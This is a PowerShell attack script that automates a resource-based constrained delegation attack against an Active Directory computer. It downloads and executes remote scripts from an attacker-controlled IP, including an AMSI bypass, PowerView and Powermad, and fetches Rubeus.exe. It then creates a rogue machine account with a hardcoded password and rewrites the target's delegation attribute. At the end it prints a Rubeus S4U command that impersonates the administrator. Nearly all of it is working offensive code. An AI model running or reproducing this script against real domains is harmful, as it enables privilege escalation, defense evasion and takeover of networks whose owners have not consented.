function Generate-RBCD{
    <#
    .SYNOPSIS

    Borrows heavily from https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff

    Enum Function: Invoke-RBCD
    Author: m0n0rchid
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None
    
    .DESCRIPTION

    Will attempt a RBCD attack on a target object

    .PARAMETER RemoteIP

    The IP of the remote attacker machine which is serving the web files

    .PARAMETER TargetComputer

    The target computer which allows for this attack

    .PARAMETER Domain

    The domain you are attacking

    .Example

    C:\PS> Generate-RBCD -RemoteIP 192.168.1.1 -TargetComputer MahComputer -Domain example.com

    Description
    -----------
    Run the attack

    #>
    
    Param(
        
        [Parameter(Position = 0, Mandatory = $true)]
        [string]
        $RemoteIP,

        [Parameter(Position = 1, Mandatory = $true)]
        [string]
        $TargetComputer,

        [Parameter(Position = 2, Mandatory = $true)]
        [string]
        $Domain

    )

    $Password = 'Summer2021!'


    try
    {
        Write-Output "[+] getting remote scripts"
        IEX(new-object system.net.webclient).downloadstring("http://$RemoteIP/amsi.txt")
        IEX(new-object system.net.webclient).downloadstring("http://$RemoteIP/powerview.txt")
        IEX(new-object system.net.webclient).downloadstring("http://$RemoteIP/Powermad.ps1")
        $file = 'C:\Windows\Tasks\Rubeus.exe'
        if (-not(Test-Path -Path $file -PathType Leaf)) {
            try {
                Write-Host "[+] downloading Rubeus"
                (New-Object System.Net.WebClient).DownloadFile("http://$RemoteIP/Rubeus.exe", $file)
            }
            catch {
                Write-Output $PSItem.ToString()
                Exit
            }
        }
    }
    catch
    {
        Write-Output $PSItem.ToString()
    }

    try
    {
        Write-Output "[+] getting ACE"
        $AttackerSID = Get-DomainUser attacker -Properties objectsid | Select -Expand objectsid
        $ACE = Get-DomainObjectACL $TargetComputer | ?{$_.SecurityIdentifier -match $AttackerSID}
        ConvertFrom-SID $ACE.SecurityIdentifier
    }
    catch
    {
        Write-Output $PSItem.ToString()
        Exit
    }


    try
    {
        Write-Output "[+] creating new machine account"
        New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString $Password -AsPlainText -Force)
        $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
        $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
        $SDBytes = New-Object byte[] ($SD.BinaryLength)
        $SD.GetBinaryForm($SDBytes, 0)
    }
    catch
    {
        Write-Output $PSItem.ToString()
        Exit
    }

    try
    {
        Write-Output "[+] getting and displaying the ACL"
        Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
        $RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
        $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
        $Descriptor.DiscretionaryAcl
    }
    catch
    {
        Write-Output $PSItem.ToString()
        Exit
    }

    try
    {
        Write-Output "[+] running Rubeus for new hash"
        $data = .\Rubeus.exe hash /password:$Password /user:attackersystem /domain:ops.comply.com | Select-String rc4
        $rc4 = $data | foreach-object {
            $d = $_ -split " "
            $d[21]
        }
        Write-Output "[+] rc4 hash: $rc4"
        Write-Output "[+] Run Rubeus s4u attack: "
        Write-Output ".\Rubeus.exe s4u /user:attackersystem$ /rc4:$rc4 /impersonateuser:administrator /msdsspn:cifs/$TargetComputer /altservice:host,termsrv,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm /ptt"
    }
    catch
    {
        Write-Output $PSItem.ToString()
        Exit
    }
}